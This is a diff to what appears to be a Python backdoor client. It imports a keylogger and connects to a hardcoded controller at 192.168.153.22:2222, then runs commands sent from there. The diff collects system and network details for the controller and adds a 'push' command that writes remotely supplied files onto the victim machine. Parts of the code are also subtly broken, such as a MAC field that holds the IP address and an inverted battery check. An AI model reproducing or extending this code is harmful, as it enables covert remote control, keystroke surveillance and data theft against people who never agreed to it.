@@ -9,15 +9,18 @@ from keylogging import *
 from keylogging import keylogger
 # from colorama import Fore, Style
 
+HOST,PORT = '192.168.153.22',2222
+
 def get_network_infos():
-    for no, interface, addrs in enumerate(psutil.net_if_addrs().items()):
-        return f"""
-        Interface {no+1}
-        Interface name : {interface}
-        IP address : {addrs.address}
-        MAC address : {''}
-        """
-    #RESUME FROM THIS 
+    for interface, addrs in psutil.net_if_addrs().items():
+        for getinfo in addrs:
+            return f"""
+            Interface name : {interface}
+            IP address : {getinfo.address}
+            MAC address : {getinfo.address}
+            Net mask address : {getinfo.netmask}
+            Broadcast address : {getinfo.broadcast}
+            """
 
 def get_system_information():
     if platform.system() == 'Windows':
@@ -56,7 +59,7 @@ def get_system_information():
         platform.machine(),
         platform.processor(),
         os.cpu_count(),
-        psutil.sensors_battery(),
+        '{psutil.sensors_battery().percentage}%' if psutil.sensors_battery() is None else 'The device dont have battery(Desktop)',
         'DISK INFORMATION'.center(150),
         psutil.disk_usage(os.getcwd()),
         psutil.disk_partitions(),
@@ -120,7 +123,7 @@ def create_thing(get_cmd,sock):
 
 def main_root():
     sock = st.socket(st.AF_INET, st.SOCK_STREAM)
-    sock.connect(('192.168.6.32',2222))
+    sock.connect((HOST,PORT))
 
     while True:
         sock.send(os.getcwd().encode())
@@ -203,8 +206,18 @@ def main_root():
                 except Exception as e:
                     sock.send(str(e).encode())
 
+            elif get_cmd.startswith('push'):
+                split_cmd = get_cmd.split()
+                file_name = split_cmd[1]
+                try:
+                    file_content = sock.recv(4096).decode()
+                    file = open(file_name,'w')
+                    file.write(file_content)
+                    file.close()
+                except Exception as err:
+                    sock.send(str(err).encode())
 
-            elif get_cmd in ('pwd', 'cwd'):  
+            elif get_cmd == 'pwd' or get_cmd == 'cwd':  
                 sock.send(os.getcwd().encode() + b"\n")
 
             else:
